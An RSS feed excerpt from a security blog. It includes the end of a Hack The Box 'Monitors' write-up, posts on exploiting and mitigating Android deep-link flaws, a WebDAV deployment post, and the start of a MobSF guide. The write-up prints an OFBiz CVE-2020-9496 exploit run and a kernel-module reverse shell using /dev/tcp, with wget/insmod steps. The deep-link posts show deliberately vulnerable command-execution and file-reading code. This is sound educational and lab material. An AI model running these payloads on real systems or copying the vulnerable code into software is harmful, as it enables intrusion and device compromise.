...</code></pre><blockquote><strong>Apache OFBiz</strong> is a suite of business applications flexible enough to be used across any industry. A common architecture allows developers to easily extend or enhance it to create custom features.</blockquote><p>This framework has some <a href="https://www.cvedetails.com/vulnerability-list.php?vendor_id=45&amp;product_id=28350&amp;version_id=&amp;page=1&amp;hasexp=0&amp;opdos=0&amp;opec=0&amp;opov=0&amp;opcsrf=0&amp;opgpriv=0&amp;opsqli=0&amp;opxss=0&amp;opdirt=0&amp;opmemc=0&amp;ophttprs=0&amp;opbyp=0&amp;opfileinc=0&amp;opginf=0&amp;cvssscoremin=0&amp;cvssscoremax=0&amp;year=0&amp;month=0&amp;cweid=0&amp;order=3&amp;trc=33&amp;sha=6402b2a5500eca02d0aa351eb1febae7c45a174a">serious vulnerabilities</a>, one of them being <code>CVE-2020-9496</code> which enables unauthenticated RCE:</p><blockquote>OfBiz exposes an <code>XMLRPC</code> endpoint at <code>/webtools/control/xmlrpc</code>. This is an unauthenticated endpoint since authentication is applied on a per-service basis. However, the <code>XMLRPC</code> request is processed before authentication. As part of this processing, any serialized arguments for the remote invocation are deserialized, therefore if the classpath contains any classes that can be used as gadgets to achieve remote code execution, an attacker will be able to run arbitrary system commands on any OfBiz server with same privileges as the servlet container running OfBiz.</blockquote><p>I found a really <a href="https://github.com/ambalabanov/CVE-2020-9496">great POC on Github</a> and gave it a shot:</p><pre><code>~ git clone git@github.com:ambalabanov/CVE-2020-9496.git
~ cd CVE-2020-9496
~ wget https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar -O ysoserial.jar
~ brew install --cask adoptopenjdk8brew tap adoptopenjdk/openjdk
~ brew tap adoptopenjdk/openjdk
~ java -version
~ export JAVA_HOME=`/usr/libexec/java_home -v 1.8.0_292`</code></pre><p>I setup a local server:</p><pre><code>~ python3 -m http.server 9000
Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...</code></pre><p>... and sent a curl command to see if the container would connect to it:</p><pre><code>~ python3 cve-2020-9496.py --target https://localhost:8443
cmd&gt; curl http://10.10.14.9:9000
[!] Send payload ...
[+] Done!</code></pre><p>I got a connection from <code>10.10.10.238</code> which is the host machine&apos;s IP, so I knew this was working:</p><pre><code>10.10.10.238 - - [29/Sep/2021 21:37:38] &quot;GET / HTTP/1.1&quot; 200 -
</code></pre><p>With RCE on the container, I decided to make enumeration a little easier and faster with a Python script:</p><!--kg-card-begin: html--><script src="https://gist.github.com/inesmartins/66ed776a17b81a2313a78ba3456867d0.js"></script><!--kg-card-end: html--><p>After using this script with some <a href="https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI">LFI Seclists</a>, I couldn&apos;t find any relevant files or hints, so I started thinking that this was a straightforward container escape.</p><p>I was also getting a little frustrated with not having a shell into the machine, so I decided to abandon my script and give Metasploit a try.</p><p>After some tweaking, I finally got it:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/10/Screenshot-2021-10-02-at-14.10.53.png" class="kg-image" alt="HTB Write-up | Monitors" loading="lazy"></figure><hr><h2 id="the-final-step">The final step</h2><p>This was definitely the hardest part. I knew I had to escape from the container, and tried a lot of known exploits without any luck.</p><p>Finally, after a loooong and frustrating process I found <a href="https://xcellerator.github.io/posts/docker_escape/">this</a> article from 2020: &quot;Privileged Container Escapes with Kernel Modules&quot;:</p><blockquote>It turns out that privileged containers (or just those with <code>CAP_SYS_MODULE</code>) are able to use the <a href="https://man7.org/linux/man-pages/man2/finit_module.2.html"><code>sys_init_module()</code></a> and <a href="https://man7.org/linux/man-pages/man2/finit_module.2.html"><code>sys_finit_module()</code></a> syscalls - which are what&#x2019;s used to load kernel modules. <br>As all containers share their kernel with the host (unlike VMs), this clearly results in yet another complete system compromise.</blockquote><p>This led me to find <a href="https://blog.nody.cc/posts/container-breakouts-part2/">this</a> POC:</p><figure class="kg-card kg-code-card"><pre><code>#include &lt;linux/kmod.h&gt;
#include &lt;linux/module.h&gt;
MODULE_LICENSE(&quot;GPL&quot;);
MODULE_AUTHOR(&quot;AttackDefense&quot;);
MODULE_DESCRIPTION(&quot;LKM reverse shell module&quot;);
MODULE_VERSION(&quot;1.0&quot;);
char* argv[] = {&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; /dev/tcp/10.10.10.238/4444 0&gt;&amp;1&quot;, NULL};
static char* envp[] = {&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/gcc/x86_64-linux-gnu/8/&quot;, NULL };
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}
static void __exit reverse_shell_exit(void) {
printk(KERN_INFO &quot;Exiting\n&quot;);
}
module_init(reverse_shell_init);
module_exit(reverse_shell_exit);</code></pre><figcaption>reverse-shell.c</figcaption></figure><figure class="kg-card kg-code-card"><pre><code>obj-m +=reverse-shell.o
all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean</code></pre><figcaption>Makefile</figcaption></figure><p>Note how the reverse shell is targeted at the host machine, on port <code>4444</code>, so we need to setup that listener:</p><pre><code>marcus@monitors:~$ nc -nvlp 4444</code></pre><p>On our machine, let&apos;s serve these files so that the container can fetch them using <code>wget</code>:</p><pre><code>~ python3 -m http.server 9000
Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...</code></pre><p>Now, on the Metasploit shell, let&apos;s fetch the <code>reverse-shell.c</code> and <code>Makefile</code>, build the payload and trigger it:</p><pre><code>&gt; sessions -i 1
[*] Starting interaction with 1...

python -c &apos;import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;

root@79931c1ed9a2:/usr/src/apache-ofbiz-17.12.01# whoami
root

root@79931c1ed9a2:/usr/src/apache-ofbiz-17.12.01# cd /

root@79931c1ed9a2:/# wget http://10.10.14.22:9000/reverse-shell.c
root@79931c1ed9a2:/# wget http://10.10.14.22:9000/Makefile
root@79931c1ed9a2:/# export PATH=/usr/lib/gcc/x86_64-linux-gnu/8/:$PATH
root@79931c1ed9a2:/# make clean
root@79931c1ed9a2:/# make
root@79931c1ed9a2:/# insmod reverse-shell.ko</code></pre><p>And that&apos;s it!</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/10/Screenshot-2021-10-02-at-14.13.45.png" class="kg-image" alt="HTB Write-up | Monitors" loading="lazy"></figure><hr><h2 id="references">References</h2><ul><li><a href=" https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1">https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1</a></li><li><a href=" https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-2">https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-2</a></li><li><a href="https://chryzsh.gitbooks.io/pentestbook/content/local_file_inclusion.html">https://chryzsh.gitbooks.io/pentestbook/content/local_file_inclusion.html</a></li><li><a href="https://www.hackingarticles.in/comprehensive-guide-on-remote-file-inclusion-rfi/">https://www.hackingarticles.in/comprehensive-guide-on-remote-file-inclusion-rfi/</a></li><li><a href="https://the-bilal-rizwan.medium.com/wordpress-xmlrpc-php-common-vulnerabilites-how-to-exploit-them-d8d3c8600b32">https://the-bilal-rizwan.medium.com/wordpress-xmlrpc-php-common-vulnerabilites-how-to-exploit-them-d8d3c8600b32</a></li><li><a href="https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress">https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress</a></li><li><a href="https://alexander.holbreich.org/docker-components-explained/">https://alexander.holbreich.org/docker-components-explained/</a></li><li><a href="https://github.com/zweilosec/htb-writeups/blob/master/linux-machines/hard/quick-write-up.md">https://github.com/zweilosec/htb-writeups/blob/master/linux-machines/hard/quick-write-up.md</a></li><li><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#mounted-docker-socket">https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#mounted-docker-socket</a></li><li><a href="https://www.secureideas.com/blog/2018/05/escaping-the-whale-things-you-probably-shouldnt-do-with-docker-part-1.html">https://www.secureideas.com/blog/2018/05/escaping-the-whale-things-you-probably-shouldnt-do-with-docker-part-1.html</a></li><li><a href="https://blog.nody.cc/posts/container-breakouts-part2/">https://blog.nody.cc/posts/container-breakouts-part2/</a></li></ul>]]></content:encoded></item><item><title><![CDATA[Automatic Web Disk deployment with Github Actions]]></title><description><![CDATA[<p>A Web Disk (aka: WebDav) is a protocol that provides a simple interface to manage files stored on a server - it&apos;s basically an alternative to FTP that is provided by some hosting services.</p><p>Some time ago I was given the task to deploy a website using a</p>]]></description><link>inesmartins.github.io/how-to-deploy-your-website-to-webdav-web-disk-using-github-actions/</link><guid isPermaLink="false">615c89388931258b6a4f7802</guid><category><![CDATA[webdisk]]></category><category><![CDATA[webdav]]></category><category><![CDATA[docker]]></category><category><![CDATA[github action]]></category><category><![CDATA[deploy]]></category><category><![CDATA[github pages]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Tue, 05 Oct 2021 17:28:40 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2021/10/Screenshot-2021-10-05-at-18.36.41.png" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2021/10/Screenshot-2021-10-05-at-18.36.41.png" alt="Automatic Web Disk deployment with Github Actions"><p>A Web Disk (aka: WebDav) is a protocol that provides a simple interface to manage files stored on a server - it&apos;s basically an alternative to FTP that is provided by some hosting services.</p><p>Some time ago I was given the task to deploy a website using a WebDisk and was eager to make the process automatic with a <a href="https://github.com/features/actions">Github Action</a>, but could not find one that matched my needs.</p><p>There was, however, a very handy <a href="https://hub.docker.com/r/qautomatron/docker-webdav-disk">Docker image</a> that helped me mount the disk, so I took it and built this action, which might help you out:</p><!--kg-card-begin: html--><script src="https://gist.github.com/inesmartins/e7980b4f4fa59f68ac6d4ef0f753b42f.js"></script><!--kg-card-end: html--><p>Note that you need to adjust the <code>env</code> variables to your website, and you should also configure <code>WEBDISK_USER</code> and <code>WEBDAV_PASSWORD</code> as <a href="https://docs.github.com/en/actions/security-guides/encrypted-secrets">Github Secrets</a>.</p><p>Hope this helps someone out there :)</p>]]></content:encoded></item><item><title><![CDATA[Exploiting Deep Links in Android - Part 4 (Mitigation)]]></title><description><![CDATA[<h2 id="preventing-deep-link-hijacking">Preventing Deep Link Hijacking</h2><p>When it comes to preventing Deep Link Hijacking, the message is simple: stop using Scheme URLs and start using (properly verified) App Links or Intent URLs.</p><p>[If you&apos;re lost maybe you should go back to <a href="https://inesmartins.github.io/exploiting-deep-links-in-android-part1/index.html">Part 1</a>]</p><p>As of August 2021 <a href="https://www.appbrain.com/stats/top-android-sdk-versions">only about 6%</a></p>]]></description><link>inesmartins.github.io/exploiting-deep-links-in-android-part-4-mitigation/</link><guid isPermaLink="false">614cd409fec7b20db8a36f01</guid><category><![CDATA[deep links]]></category><category><![CDATA[android]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Thu, 23 Sep 2021 20:10:50 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2021/09/maxresdefault-1-1.jpeg" medium="image"/><content:encoded><![CDATA[<h2 id="preventing-deep-link-hijacking">Preventing Deep Link Hijacking</h2><img src="inesmartins.github.io/content/images/2021/09/maxresdefault-1-1.jpeg" alt="Exploiting Deep Links in Android - Part 4 (Mitigation)"><p>When it comes to preventing Deep Link Hijacking, the message is simple: stop using Scheme URLs and start using (properly verified) App Links or Intent URLs.</p><p>[If you&apos;re lost maybe you should go back to <a href="https://inesmartins.github.io/exploiting-deep-links-in-android-part1/index.html">Part 1</a>]</p><p>As of August 2021 <a href="https://www.appbrain.com/stats/top-android-sdk-versions">only about 6% of Android devices</a> were still using Android 5 (Lollipop) or earlier versions of the OS, which don&#x2019;t support App Links. So at this point, there are not a lot of excuses to still use Scheme URLs, which are insecure by design.</p><p>However, as discussed on <a href="https://inesmartins.github.io/exploiting-deep-links-in-android-part1/index.html">Part 1</a>, App Links can be tricky to verify correctly. Luckily, there are some tools that can help with this task.</p><p>Google provides a <a href="https://support.google.com/google-ads/answer/10710301?hl=en">Deep Link Validator</a> in their Ads platform as well as a <a href="https://developers.google.com/digital-asset-links/tools/generator">Statement List Generator and Tester</a>. This tools enables you to test if a given site domain grants app deep linking to the app with the specified name and <code>SHA256</code> fingerprint:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-23-at-20.36.11.png" class="kg-image" alt="Exploiting Deep Links in Android - Part 4 (Mitigation)" loading="lazy"></figure><p>I found this tool to be insufficient, and couldn&apos;t find any other tool that gave me all of the information I needed about an application&apos;s App Links.</p><p>As such, I ended up developing <a href="https://github.com/inesmartins/Android-App-Link-Verification-Tester">an open source tool</a> that, among other things, can help you check if the App Links registered on the application are correctly verified:</p><pre><code>~ python3 Android-Deep-Link-Analyser/deeplink_analyser.py \
-apk com.twitter.android.apk \
-p com.twitter.android \
-op verify-applinks</code></pre><p>The output looks something like:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-23-at-20.40.32.png" class="kg-image" alt="Exploiting Deep Links in Android - Part 4 (Mitigation)" loading="lazy"></figure><p>This tool has a lot of other features that might interested you. <br>Also, if you have any ideas, corrections or suggestions I would love to receive them on Github!</p><hr><h2 id="validating-untrusted-data">Validating Untrusted Data</h2><p>As a general rule, you should treat all data received via deep link as being potentially malicious. As such, this data should be properly <strong>validated</strong>, <strong>sanitized </strong>and <strong>encoded</strong>.</p><p>If you remember, a lot of the vulnerabilities we explored on the previous posts could have been prevented if the developers checked a given URL against an allowlist.</p><p>However, when parsing and checking URLs we should keep in mind that a lot of <a href="https://hackerone.com/reports/431002">popular URL parsers have known vulnerabilities</a>:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="https://lh5.googleusercontent.com/KTZM2xQgLFfena7OJJakPkLnvyX3lcAdQVdinLeaIxuCVskdMO3g2es-7UT8u6kzU2532AjrJiCFFZtu2aEFl8y7ph7TyprwHTsDgYJJrcO6KN_CborYhhSlOZLTWfVTlwVc5wK7Qyw=s0" class="kg-image" alt="Exploiting Deep Links in Android - Part 4 (Mitigation)" loading="lazy"></figure><p>Note that this issue is now fixed for API 28 - triggering a deep links with a malformed URL loads the attacker&apos;s scripts in Chrome rather than the app&#x2019;s <code>WebView</code> - but this is still valid for older APIs.</p><hr><h2 id="webview-hardening">WebView Hardening</h2><p>As we saw on the previous posts, <code>WebViews</code> can potentially lead to <strong>local file exfiltration,</strong> they can allow a malicious user to <strong>access data</strong> created by other applications, and they&apos;re vulnerable to common web vulnerabilities.</p><p>So, when it comes to <code>WebViews</code> we should first ask ourselves: &quot;could we replace it with a native Android UI component?&quot; </p><p>If the answer is &quot;Yes&quot; we should go with the native approach.</p><p>If the answer is &quot;No&quot; we should enforce the following settings, unless absolutely necessary:</p><pre><code class="language-JavaScript">setJavaScriptEnabled(false);
setAllowFileAccess(false);
setAllowContentAccess(false);
setAllowFileAccessFromFileURLs(false);
setAllowUniversalAccessFromFileURLs(false);
setJavaScriptCanOpenWindowsAutomatically(false);
setMixedContentMode(1);</code></pre><p>You should also be careful when using the following options:</p><pre><code class="language-JavaScript">setDomStorageEnabled
setCacheMode
setAppCacheEnabled + setAppCachePath
setGeolocationEnabled +setGeolocationDatabasePath</code></pre><p>Note that these settings are safe by default on &quot;modern&quot; Android APIs, but you should verify if the app developer has not explicitly set an insecure configuration.</p><p>Finally, if your app directs users to URLs outside your domain, consider using <a href="https://developer.chrome.com/docs/android/custom-tabs/overview/">Chrome Custom Tabs</a> instead of a <code>WebView</code>:</p><blockquote>CCT opens faster than a browser and, if preloaded via its warm-up call, is potentially even faster than a WebView. While it still runs Javascript, it is in its own process, which prevents apps from running malicious code. Furthermore, the CCT UI provides an action bar which shows the URL of the page being loaded, along with an SSL verification lock icon for secure pages.</blockquote><hr><p>Hopefully, you&apos;re now better equipped to protect your application.<br>On the next post we&apos;ll explore Testing methodologies.</p>]]></content:encoded></item><item><title><![CDATA[Exploiting Deep Links in Android - Part 3]]></title><description><![CDATA[<p>So .. what else can we do with deep links?</p><hr><h2 id="local-file-inclusion-lfi">Local File Inclusion (LFI)</h2><p>In <a href="https://inesmartins.github.io/exploiting-deep-links-in-android-part-2/index.html">part 2</a> we saw how to achieve LFI via the <code>WebView.loadUrl</code> method. In this part we&apos;ll explore an alternative that doesn&apos;t require the application to contain a <code>WebView</code>. </p><p>Let&apos;s</p>]]></description><link>inesmartins.github.io/exploiting-deep-links-in-android-part-3/</link><guid isPermaLink="false">61325b65ca603212098f5e4b</guid><category><![CDATA[android]]></category><category><![CDATA[deep links]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sat, 04 Sep 2021 20:07:17 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2021/09/maxresdefault-1.jpeg" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2021/09/maxresdefault-1.jpeg" alt="Exploiting Deep Links in Android - Part 3"><p>So .. what else can we do with deep links?</p><hr><h2 id="local-file-inclusion-lfi">Local File Inclusion (LFI)</h2><p>In <a href="https://inesmartins.github.io/exploiting-deep-links-in-android-part-2/index.html">part 2</a> we saw how to achieve LFI via the <code>WebView.loadUrl</code> method. In this part we&apos;ll explore an alternative that doesn&apos;t require the application to contain a <code>WebView</code>. </p><p>Let&apos;s continue using the <code>ABC Bank</code> Android application as an example, and imagine that their customer support team uses deep links to help customers see important information displayed inside the app.</p><p>But in this case, instead of a parameter that specifies a web page, the deep link contains the path to a local file, e.g.:</p><pre><code>abcbank://help?file=how-to-enable-mfa.txt</code></pre><p>When the application receives this deep link, it opens the local file, reads its contents and displays in inside a <code>TextView</code>, as shown below:</p><pre><code class="language-Android">String file = getIntent().getData().getQueryParameter(&apos;file&apos;);

AssetManager am = getAssets()
InputStream is = am.open(file);
BufferedReader r = new BufferedReader(new InputStreamReader(is));
StringBuilder str_to_display = &quot;&quot;;

for (String line; (line = r.readline()) != null; ) {
    str_to_display.append(line).append(&apos;\n&apos;);
}

TextView tv = findViewById(R.id.myTextView);
tv.setText(str_to_display.toString());</code></pre><p>So, what&apos;s the danger here? Surely if a user sees their <em>own</em> local data displayed on the screen that&apos;s not much of an issue.</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-05-at-10.59.34.png" class="kg-image" alt="Exploiting Deep Links in Android - Part 3" loading="lazy"></figure><p>Well, for starters it depends on whether or not the application enforces any validations when it comes to the files that can be specified via deep link. If there aren&apos;t any validations, then it all comes down to the data can be accessed from the application.</p><p>Note, for example, that if the application includes the <a href="https://developer.android.com/reference/android/Manifest.permission#READ_EXTERNAL_STORAGE">READ_EXTERNAL_STORAGE</a> permission, it can access files stored in shared directories, including those generated by other apps (note that since API 29 this is not possible since all storage is scoped).</p><p>So, it&apos;s not much of a leap to imagine that a malicious application could write a malicious file that would then be read by the victim app. Depending on the <code>WebView</code> configurations, this local file could then read all of the application files and exfiltrate them.</p><p>The attack surface can also be expanded if the application has access to <a href="https://developer.android.com/guide/topics/providers/content-providers">Content Providers</a>, which are interfaces that allow multiple apps to share data.</p><h2 id="cross-site-request-forgery-csrf">Cross-Site Request Forgery (CSRF)</h2><p>Usually, when we talk about CSRF, we&apos;re exploiting some Cookie (mis)configuration in order to trick a user into performing an unintended action. A typical scenario would be a phishing link that performs a <code>GET</code> request that does some sort of account state change.</p><p>The same scenario is possible in Android if the application registers a deep link that &quot;automatically&quot; performs an action without any additional confirmation from the user.</p><p>A very straightforward example of this was <a href="https://hackerone.com/reports/583987">reported in 2019</a> on the Periscope app: in short, it was possible to trick a user of the Periscope application into following another user of the app, simply by tricking the victim into clicking on a deep link similar to:</p><pre><code>pscp://user/&lt;any-user-id&gt;/follow
</code></pre><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-05-at-11.11.37-1.png" class="kg-image" alt="Exploiting Deep Links in Android - Part 3" loading="lazy" width="443" height="650"></figure><p>The application, in essence, behaves as the browser by authenticating and sending the request without confirming with the user if they want to perform said action. And the impact is basically whatever feature is supported by the app itself.</p><h2 id="remote-code-execution-rce">Remote Code Execution (RCE)</h2><p>Achieving RCE is theoretically possible, but very unlikely, since it would require very poor judgement on the part of the application&apos;s developers.</p><p>Let&apos;s go back to the <code>ABC Bank</code> Android app. Their customer support team knows that some OS versions have specific bugs, but their clients are not tech-savvy enough to check the OS by themselves, so they send them a deep link such as this one:</p><pre><code>abcbank://help?cmd=cat%20/system/build.prop</code></pre><p>When the application receives this deep link, it executes the <code>cat /system/build.prop</code> command using <a href="https://docs.oracle.com/javase/7/docs/api/java/lang/Runtime.html">Runtime.getRuntime().exec()</a>, and then the output is displayed on a <code>TextView</code>, just as before:</p><pre><code>String command = getIntent().getData().getQueryParameter(&apos;cmd&apos;);
Process process = Runtime.getRuntime().exec(command)

InputStreamReader isr = InputStreamReader(process.inputStream);
BufferedReader r = new BufferedReader(isr);
StringBuilder str_to_display = &quot;&quot;;

for (String line; (line = r.readline()) != null; ) {
    str_to_display.append(line).append(&apos;\n&apos;);
}

TextView tv = findViewById(R.id.myTextView);
tv.setText(str_to_display.toString());</code></pre><p>The client then simply reads the output to the customer support agent, which can then take that info into account when supporting the user.</p><p>In this scenario and without any additional validations, it would be possible for an attacker to remotely execute commands on the device by simply tricking a victim into clicking a deep link such as:</p><pre><code>deeplink://path?cmd=&lt;the-evil-command&gt;</code></pre><p>But, again, it would be a sign of very poor judgement to allow a user to specify commands directly via deep link, particularly without any additional validations, and proof of that is the fact that I couldn&apos;t find any actual examples of RCE reported in the wild.</p><hr><p>And that&apos;s it for now! On the next post I&apos;ll look into <a href="https://inesmartins.github.io/exploiting-deep-links-in-android-part-4-mitigation/index.html">Mitigation</a>.</p>]]></content:encoded></item><item><title><![CDATA[MobSF "IPA Binary Analysis" | Step by Step]]></title><description><![CDATA[<p><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF">MobSF</a> is an open source static and dynamic analysis tool for Android and iOS, which can be used to quickly detect major issues on your mobile application.</p><p>When scanning an <code>.ipa</code>, the &quot;IPA Binary Analysis&quot; section can report multiple issues that can be hard to interpret. </p><p>Hopefully this</p>]]></description><link>inesmartins.github.io/mobsf-ipa-binary-analysis-step-by-step/</link><guid isPermaLink="false">6116ea0cfd1c6c08ebabac74</guid><category><![CDATA[ipa]]></category><category><![CDATA[mobsf]]></category><category><![CDATA[binary analysis]]></category><category><![CDATA[rev]]></category><category><![CDATA[apple]]></category><category><![CDATA[binary exploitation]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sat, 21 Aug 2021 21:57:25 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-22-at-10.17.13.png" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-22-at-10.17.13.png" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step"><p><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF">MobSF</a> is an open source static and dynamic analysis tool for Android and iOS, which can be used to quickly detect major issues on your mobile application.</p><p>When scanning an <code>.ipa</code>, the &quot;IPA Binary Analysis&quot; section can report multiple issues that can be hard to interpret. </p><p>Hopefully this article will help you understand why each vulnerability was reported and how to fix it.</p><hr><h2 id="getting-to-the-good-stuff">Getting to the good stuff</h2><p><code>.ipa</code> files are actually just zipped files that include the application executable and a bunch of other stuff.</p><p>When we talk about binary analysis, we&apos;re actually just talking about analysing this executable file, so the first thing we need to do is <strong>find it</strong>.</p><p>Note that if you don&apos;t have access to the <code>.ipa</code> you can extract it from the App Store using <a href="https://github.com/majd/ipatool">ipatool</a>:</p><pre><code>~ brew tap majd/repo
~ brew install ipatool
~ ipatool download --bundle-identifier &lt;app-bundle-id&gt; --email &lt;appstore-account-email&gt; --password &lt;appstore-account-password&gt;
</code></pre><p>So, now that you have your <code>.ipa</code> it&apos;s time to unzip it and look inside:</p><pre><code>~ unzip MyApp.ipa
~ cd Payload/
~ cd MyApp.app/
~ file MyApp
MyApp: Mach-O 64-bit executable arm64</code></pre><p>As you can see above, the app binary is compiled for <code>ARM</code> and uses the <code>Mach-O</code> file format.</p><p>A more thorough analysis of this binary can be done using <a href="https://www.manpagez.com/man/1/otool/">otool</a>. You should become familiar with this tool since it will help us validate and fix most of the issues reported below.</p><p>Alternatively, I also recommend <a href="https://h3adsh0tzz.com/projects/htool/">htool</a>, which serves the similar purpose of analysing <code>Mach-O</code> binaries.</p><hr><h2 id="arc">ARC</h2><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.12.27.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="1125" height="102" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-21-at-20.12.27.png 600w, inesmartins.github.io/content/images/size/w1000/2021/08/Screenshot-2021-08-21-at-20.12.27.png 1000w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.12.27.png 1125w"></figure><p>If you&apos;re used to working with Swift, then you most likely know <code>ARC</code> or &quot;Automatic Reference Counting&quot; simply as <a href="https://docs.swift.org/swift-book/LanguageGuide/AutomaticReferenceCounting.html">one of the core features</a> of the language. </p><p>However, <code>ARC</code> is actually a feature of the Clang compiler, and unlike with Swift, you can<em> </em>(but <a href="https://stackoverflow.com/questions/8760431/to-arc-or-not-to-arc-what-are-the-pros-and-cons/8760820#8760820">shouldn&apos;t</a>) use Objective-C without using Automatic Reference Counting.</p><p>If you&apos;ve never heard of &quot;Automatic Reference Counting&quot; you should basically know that it &quot;automatically frees up the memory used by class instances when those instances are no longer needed&quot;. </p><p>The alternative is to leave memory management to the developer, who is always less reliable and can easily make mistakes that can lead to memory corruption vulnerabilities.</p><p>So, if your application is written (at least partially) in Objective-C, you should first make sure that the project is configured to use <code>ARC</code> by checking the <code>&quot;Objective-C Automatic Reference Counting&quot;</code> setting under the <code>&quot;Build Settings&quot;</code> tab:</p><figure class="kg-card kg-image-card kg-width-wide kg-card-hascaption"><img src="inesmartins.github.io/content/images/2021/08/image-6.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="1086" height="432" srcset="inesmartins.github.io/content/images/size/w600/2021/08/image-6.png 600w, inesmartins.github.io/content/images/size/w1000/2021/08/image-6.png 1000w, inesmartins.github.io/content/images/2021/08/image-6.png 1086w"><figcaption>https://advancetechtutorial.blogspot.com/2016/07/xcode-arc-automatic-reference-counting.html</figcaption></figure><p>If this property is set to <code>No</code>, you should &quot;Convert&quot; the project, as shown below:</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="inesmartins.github.io/content/images/2021/08/image-5.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="561" height="421"><figcaption>https://stackoverflow.com/questions/8969644/tool-for-transitioning-to-arc/8969662</figcaption></figure><p>You can also check the <code>&quot;Compile Sources&quot;</code> section under the <code>&quot;Build Phases&quot;</code> tab for the presence of the <code>-fno-objc-arc</code> flag, which is used to exclude specific files from using <code>ARC</code>, as shown below:</p><figure class="kg-card kg-image-card kg-width-wide kg-card-hascaption"><img src="inesmartins.github.io/content/images/2021/08/flag-1024x434.jpeg" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="1024" height="434" srcset="inesmartins.github.io/content/images/size/w600/2021/08/flag-1024x434.jpeg 600w, inesmartins.github.io/content/images/size/w1000/2021/08/flag-1024x434.jpeg 1000w, inesmartins.github.io/content/images/2021/08/flag-1024x434.jpeg 1024w"><figcaption>https://thomashanning.com/how-to-disable-arc-for-objective-c-files/</figcaption></figure><p>Since there are limitations that come with using <code>ARC</code>, the adequacy of these exceptions should be evaluated on a case by case basis.</p><p>As mentioned above, <code>otool</code> can help us understand our binary files a little better.</p><p>When it comes to <code>ARC</code> we can use this tool to check for the presence of ARC-related symbols, such as <code>_objc_release</code>, <code>_objc_autorelease</code>, <code>_objc_storeStrong</code>, <code>_objc_retain</code>, etc.:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-22-at-11.52.58.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy"></figure><p>Note the usage of <code>otool</code>&apos;s <code>-I</code> and <code>-v</code> flags:</p><pre><code>~ otool
	...
	-I print the indirect symbol table
